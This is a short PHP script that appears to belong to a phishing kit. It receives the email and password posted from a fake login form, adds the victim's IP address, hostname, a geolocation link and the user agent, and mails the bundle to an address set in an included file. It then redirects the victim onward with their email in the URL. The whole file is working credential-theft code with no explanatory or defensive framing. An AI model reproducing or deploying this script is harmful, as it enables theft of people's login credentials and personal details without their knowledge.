<?php
if ($_POST["login"] != "" and $_POST["passwd"] != "") {
  $ip = getenv("REMOTE_ADDR");
  $hostname = gethostbyaddr($ip);
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $message .= "--------------0nline Info-----------------------\n";
  $message .= "email            : " . $_POST['login'] . "\n";
  $message .= "password           : " . $_POST['passwd'] . "\n";
  $message .= "|--------------- I N F O | I P -------------------|\n";
  $message .= "|Client IP: " . $ip . "\n";
  $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
  $message .= "User Agent : " . $useragent . "\n";
  $message .= "|----------- unknown --------------|\n";
  include 'email.php';
  $subject = "Card | $ip"; {
    mail("$to", "$subject", $message);
  }
  $praga = rand();
  $praga = md5($praga);
  header("Location: go.php?email=" . $_POST['login']);
} else {
  header("Location: index.php");
}
